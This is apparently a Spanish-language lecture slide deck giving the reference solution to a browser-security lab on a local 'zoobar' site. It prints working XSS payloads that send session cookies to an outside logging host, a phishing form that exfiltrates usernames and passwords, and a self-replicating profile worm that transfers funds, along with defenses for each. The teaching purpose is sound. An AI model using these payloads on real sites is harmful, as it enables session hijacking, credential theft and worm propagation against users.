---
marp: true
theme: default
paginate: true
backgroundColor: #fff
backgroundImage: url('../../assets/hero-background.svg')
style: |
  section {
    font-size: 24px;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    align-items: flex-start;
    padding-top: 40px;
  }

  table {
    font-size: 0.78em;
  }

  code {
    font-size: 0.85em;
  }

  pre {
    font-size: 0.72em;
    width: 100%;
  }

  /* Make sub-bullets lighter and smaller */
  ul ul li, ol ol li {
    color: #666666;
    font-size: 0.9em;
  }

  /* Make nested sub-bullets even lighter, italic, and smaller */
  ul ul ul li, ol ol ul li {
    color: #666666;
    font-style: italic;
    font-size: 0.8em;
  }

  /* Alternative: Use opacity for a more subtle effect */
  ul ul, ol ol {
    opacity: 0.8;
  }
---

# Lab 4: Browser Security

### Solución de referencia — IIC2531

> **Solución de referencia.** Este deck explica *cómo se resuelve* el laboratorio.
> No es la entrega de un alumno ni corresponde a un intento real: es material
> docente con las respuestas esperadas y su justificación.

---

# Qué pide el laboratorio

- Tres ataques contra el sitio **zoobar** en `http://localhost:8080/`.
- Parte 1: **XSS** en la página *Users* para robar la cookie de sesión.
- Parte 2: **phishing** con un formulario de login falso.
- Parte 3: **gusano** que se propaga por los perfiles de usuario.
- Restricción clave: **no modificar el código de zoobar**; el ataque vive en archivos `answer-*`.
- Se evalúa con `make check-lab4` sobre Chrome *headless* vía **Puppeteer**.
- La base se limpia: solo existe el usuario `attacker` además de la víctima.

---

# Modelo de amenaza

- El atacante controla **contenido** que el navegador de la víctima va a interpretar.
- La víctima está autenticada en zoobar y comparte el mismo navegador para todo.
- El navegador, su sandbox y la red se consideran confiables.
- Lo explotado es la **frontera entre datos y código**: HTML, JavaScript y cookies.
- Objetivo del atacante: leer el secreto (cookie), actuar como la víctima o capturar sus credenciales.
- Defensa general: que los datos del atacante nunca se conviertan en código en el origen de zoobar.

---

# Parte 1: panorama del XSS

- La página *Users* refleja un parámetro de la URL dentro del HTML.
- Si el parámetro no se escapa, el navegador lo interpreta como **markup**.
- Secuencia del ataque:
  1. Imprimir la cookie con `alert()`.
  2. Enviarla al script de registro del curso.
  3. Construir una URL que ejecute el script en el navegador de la víctima.
  4. Robar la cookie.
  5. Ocultar cualquier señal visible del ataque.
- Todo esto ocurre **en el origen de zoobar**, así que el script corre con sus privilegios.

---

# Ejercicio 1: imprimir la cookie

- `document.cookie` expone las cookies **no HttpOnly** del origen actual.
- Se inyecta un `<script>` en `zoobar/templates/users.html` (solo para experimentar).
- Sirve para verificar que el navegador entrega la sesión y compararla con el monitor de red.

```html
<script>
  alert(document.cookie);
</script>
```

- `answer-1.js` contiene **solo JavaScript**, sin etiquetas `<script>`.
- Al terminar, se restaura `users.html`: el ataque real no modifica el servidor.

---

# Ejercicio 2: registrar la cookie

- En lugar de mostrarla, se envía al script de registro del curso.
- La cookie contiene `;`, espacios y caracteres especiales: hay que **codificarla**.
- `encodeURIComponent` produce un valor seguro para el query string.

```js
var img = new Image();
img.src = "https://css.csail.mit.edu/6.566/2026/labs/log.php?cookie="
        + encodeURIComponent(document.cookie);
```

- `new Image()` dispara un GET sin navegar ni modificar el DOM.
- Es la primitiva de exfiltración que se reutiliza en los ejercicios siguientes.

---

# Ejercicio 3: XSS reflejado

- El bug está en *Users*: el parámetro `user` se inserta **sin escapar** dentro del atributo `value` del formulario de búsqueda.
- Entrada normal: `?user=alice`.
- Entrada maliciosa: cerrar el atributo y abrir un `<script>`.

```text
"><script>alert(document.cookie)</script>
```

- El HTML resultante queda:

```html
<input name="user" value=""><script>alert(document.cookie)</script>">
```

- El parser HTML ve una etiqueta `<script>` real: **no importa que venga de un dato**, el navegador la ejecuta.
- Restricciones: sin cambios en zoobar, sin cuentas extra y la URL debe empezar con `/zoobar/index.cgi/users?`.

---

# Ejercicio 3: la URL codificada

- El servidor **decodifica** la URL antes de pasarla a la aplicación.
- Por eso el payload debe ir codificado una sola vez, no dos.
- Reglas prácticas: espacio → `+` o `%20`; `+` literal → `%2B`; `<` → `%3C`; `>` → `%3E`; `"` → `%22`.

| Carácter | Codificado |
|---|---|
| `"` | `%22` |
| `<` | `%3C` |
| `>` | `%3E` |
| `/` | `%2F` |
| `+` | `%2B` |

```text
http://localhost:8080/zoobar/index.cgi/users?user=%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
```

- El valor debe estar **en la primera línea** de `answer-3.txt`.

---

# Ejercicio 4: robar la cookie

- Se reemplaza el `alert()` por el cargador del ejercicio 2, embebido en la URL.
- El script se ejecuta como parte de la página legítima, así que `document.cookie` sigue disponible.

```js
var i = new Image();
i.src = "https://css.csail.mit.edu/6.566/2026/labs/log.php?cookie="
      + encodeURIComponent(document.cookie);
```

- La URL completa se codifica y se guarda en `answer-4.txt`.
- Con la cookie, el atacante puede **reproducir la sesión** de la víctima: el servidor no distingue ambos navegadores.

---

# Ejercicio 5: ocultar las huellas

- Al inyectar, la búsqueda falla y aparece un aviso tipo **“Cannot find that user”**.
- La página debe verse **exactamente** igual que `/zoobar/index.cgi/users`, salvo la barra de direcciones.
- Solución: inyectar CSS que oculte el aviso y neutralizar el resto del HTML.

```html
<style>
  .warning { display: none !important; }
</style>
```

- El payload se cierra con un comentario `<!--` para que el `">` sobrante del template no se muestre.
- `display:none` puede fallar en marcos e imágenes: `visibility:hidden` es más seguro en esos casos.
- El envío de la cookie debe seguir ocurriendo.

---

# Por qué funciona el XSS y cómo se defiende

- Causa raíz: **confusión de contextos**. Un dato se concatena en HTML sin saber dónde termina.
- Codificar la URL no arregla nada: solo cambia la representación del transporte.
- Defensa correcta: **escaping contextual en la salida**.
  - HTML: `&lt;`, `&gt;`, `&amp;`, `&quot;`.
  - Atributos: comillas siempre escapadas y atributos entrecomillados.
  - JavaScript y URL: codificación específica del contexto.
- Mejor aún: *autoescaping* del motor de templates y evitar `innerHTML` con datos no confiables.
- **CSP** y **Trusted Types** reducen el impacto, pero no sustituyen al escaping.

---

# Parte 2: panorama del phishing

- La víctima **no ha iniciado sesión** y visita una página controlada por el atacante.
- El atacante replica el formulario de login de zoobar y lo hace funcional contra el sitio real.
- Al enviar, captura usuario y contraseña y luego muestra el sitio oficial.
- Secuencia: clonar → interceptar `submit` → exfiltrar → redirigir.
- A diferencia del XSS, aquí no se ejecuta código en el origen de zoobar: se **suplanta la interfaz**.

---

# Ejercicio 6: clonar el formulario

- Se copia el formulario desde `zoobar/templates/login.html` a `answer-6.html`.
- Los `action` y recursos deben apuntar al servidor real, con URL absoluta.

```html
<form action="http://localhost:8080/zoobar/index.cgi/login" method="post">
  <input type="text" name="login_username">
  <input type="password" name="login_password">
  <input type="submit" name="submit_login" value="Log in">
</form>
```

- Nombres de campos idénticos a los reales: `login_username`, `login_password`, `submit_login`.
- Prueba: el formulario falso debe iniciar sesión de verdad en zoobar.
- Sin cambios en zoobar: el ataque es solo HTML del atacante.

---

# Ejercicio 7: interceptar el envío

- Se necesita leer los valores **en el instante del envío**, no antes ni después.
- `addEventListener('submit', ...)` o el atributo `onsubmit` entregan el evento y el formulario.
- Aquí solo se muestra la contraseña para comprobar la intercepción.

```html
<script>
document.querySelector('form').addEventListener('submit', function (e) {
  alert(e.target.login_password.value);
});
</script>
```

- `e.target` es el formulario; se accede a cada campo por su `name`.
- El manejador se ejecuta antes de que el navegador inicie la navegación.

---

# Ejercicio 8: robar las credenciales

- Se reemplaza el `alert()` por una petición al script de registro, con `usuario/contraseña`.
- Problema: al navegar, el navegador **cancela las peticiones pendientes**, incluida la del robo.
- Solución: cancelar el envío, exfiltrar y reenviar el formulario un poco después.

```js
form.addEventListener('submit', function (e) {
  e.preventDefault();                       // no navegar todavía
  var f = e.target;
  new Image().src = LOG + "?cookie=" + encodeURIComponent(
      f.login_username.value + "/" + f.login_password.value);
  setTimeout(function () { f.submit(); }, 150);
});
```

- `f.submit()` **no vuelve a disparar** `submit`; si se usa `dispatchEvent`, hace falta una bandera para no entrar en bucle.

---

# Ejercicio 9: redirigir al sitio real

- El objetivo es que la víctima vea el sitio oficial después del robo.
- zoobar decide si el envío fue *Login* o *Register* mirando el parámetro **`submit_login`** (o `submit_registration`).
- `form.submit()` no incluye el botón pulsado, así que hay que añadirlo como campo oculto.

```html
<input type="hidden" name="submit_login" value="Log in">
```

- Sin ese parámetro, el servidor no procesa el login como tal y la víctima no entra.
- Se puede redirigir a `/zoobar/index.cgi/` tras el `setTimeout`, o dejar que el POST real complete la sesión.

---

# Por qué funciona el phishing y cómo se defiende

- Funciona porque el usuario **no puede distinguir** la réplica de la interfaz legítima.
- El formulario falso no necesita romper el navegador: solo convencer y reenviar.
- Defensas del lado del sitio:
  - **HTTPS + HSTS** y certificados: hacen más difícil suplantar el origen.
  - **WebAuthn / passkeys**: la credencial se liga al origen real; un clon no puede usarla.
  - Segundo factor resistente a phishing (no TOTP, que se puede reenviar en tiempo real).
  - Políticas anti-*framing* (`frame-ancestors`, `X-Frame-Options`) y educación del usuario.
- Defensas del navegador: indicadores de origen, gestores de contraseñas que detectan dominios distintos.

---

# Parte 3: gusano de perfiles

- zoobar muestra el campo `profile` **sin escapar** en la página de perfil: es un **XSS almacenado**.
- Al ver un perfil infectado se ejecuta el script, que:
  1. transfiere **1 zoobar** del visitante a `attacker`;
  2. copia el código del gusano al perfil del visitante;
  3. oculta la interfaz y muestra **“Scanning for viruses...”**.
- Así, cada visita a un perfil infectado infecta a un nuevo usuario.
- Restricciones: menos de 15 s, sin clics, sin cambiar la URL `/users?user=<username>`, sin marcos visibles, y el perfil debe parecer intacto (10 zoobars, sin transferencias).

---

# Gusano: transferencia y replicación

- El script corre **en el mismo origen** que zoobar: no hay SOP de por medio y se puede usar `XMLHttpRequest`.

```js
var x = new XMLHttpRequest();
x.open("POST", "/zoobar/index.cgi/transfer", false);
x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
x.send("recipient=attacker&zoobars=1&submit_transfer=Transfer");
```

- Replicación: leer el formulario de edición propio, extraer el `profile`, añadir el gusano y reenviarlo.

```js
var e = new XMLHttpRequest();
e.open("GET", "/zoobar/index.cgi/edit_profile", false);
e.send();
// parsear el HTML, tomar el textarea "profile" y concatenar el payload
```

- `document.createElement` + `appendChild` sirven para construir y ocultar nodos.
- La URL no cambia porque todo se hace por AJAX, no por navegación.

---

# Gusano: por qué es un gusano y cómo se corta

- Es un gusano porque se **replica automáticamente**: no requiere que la víctima haga nada más que mirar un perfil.
- La transferencia da incentivo económico; la replicación da propagación.
- Límites prácticos:
  - el perfil debe seguir pareciendo normal;
  - el atacante no controla el momento de la visita;
  - si el visitante no tiene zoobars, el caso extremo no se evalúa.
- Defensas:
  - **escaping** del campo `profile` al renderizarlo (rompe la ejecución);
  - **CSP** sin `unsafe-inline` (rompe el script inline);
  - limitar HTML en perfiles y sanearlo con una lista blanca;
  - **CSRF tokens** y reautenticación para transferencias;
  - detección de contenido autorreplicante y límites de tasa.

---

# Defensas en profundidad

| Defensa | Qué bloquea | Límite |
|---|---|---|
| Escaping contextual | Convierte datos en texto, no en markup | Debe aplicarse en cada contexto de salida |
| `HttpOnly` | `document.cookie` no ve la cookie | No impide actuar como la víctima con XSS |
| `SameSite=Lax/Strict` | Envío de cookies en peticiones cruzadas | No protege mismo sitio ni XSS en el origen |
| CSP (`script-src 'self'`) | Scripts inline y orígenes no autorizados | Requiere eliminar `unsafe-inline`; no arregla HTML mal escapado |
| CSRF token | Peticiones forjadas desde otro origen | Un XSS puede leer el token del DOM |
| Validar `Origin`/`Referer` | Peticiones *state-changing* cruzadas | Puede fallar con proxies o clientes antiguos |
| Aislamiento de sitios | Separa procesos y refuerza SOP | No evita fallos lógicos dentro del mismo sitio |

- Regla: la defensa debe estar en el **sitio vulnerable**, no solo en el navegador.

---

# Problemas típicos y cómo se resuelven

| Problema | Síntoma | Solución |
|---|---|---|
| Codificación URL | El payload no se ejecuta o se ejecuta mal | Codificar una vez; `+` literal como `%2B`; revisar con el monitor de red |
| Caché del navegador | Se repite una versión vieja del ataque | Añadir `&random=<número>` a la URL mientras se desarrolla |
| Peticiones canceladas al navegar | `log.php` no recibe nada | `preventDefault()` + `setTimeout()`, o `sendBeacon`/`fetch(..., {keepalive:true})` |
| Ejecutar vs. leer | El payload aparece como texto | Verificar en el inspector si quedó dentro de un atributo o de un `<script>` |
| Cookies `HttpOnly` | `document.cookie` sale vacío | No se puede exfiltrar la cookie: usar el XSS para actuar en el origen |
| Chrome / Puppeteer | `alert()` en bucle se bloquea; nada responde a clics | Probar con efectos en el DOM (`document.loginform...`) y no depender de interacción |

---

# Preguntas de razonamiento

1. Si ya se usa `encodeURIComponent` en la URL, ¿por qué el ataque XSS sigue funcionando?
2. ¿Por qué el ejercicio 8 necesita `preventDefault()` y `setTimeout()` en lugar de simplemente enviar el formulario?
3. ¿Basta `HttpOnly` para neutralizar un XSS? ¿Qué puede hacer todavía el atacante?
4. ¿Por qué el gusano de perfiles puede usar `XMLHttpRequest` sin preocuparse por la Same-Origin Policy, y por qué un token CSRF no lo detiene?

---

# Respuestas breves

1. Porque la codificación es del **transporte**: el servidor decodifica y luego refleja el dato en HTML. El fallo está en el **escaping de salida**, no en la URL.
2. Porque al navegar el navegador **cancela** la petición de exfiltración. Se evita la navegación, se envía la petición y se reenvía el formulario después.
3. No. Impide **leer** la cookie, pero el script sigue ejecutándose en el origen: puede hacer peticiones autenticadas, leer el DOM y exfiltrar datos de la página.
4. Porque el script corre **dentro del origen de zoobar** y puede leer el DOM y el token. La SOP solo separa orígenes distintos; el token CSRF no protege contra código que ya vive en el sitio.
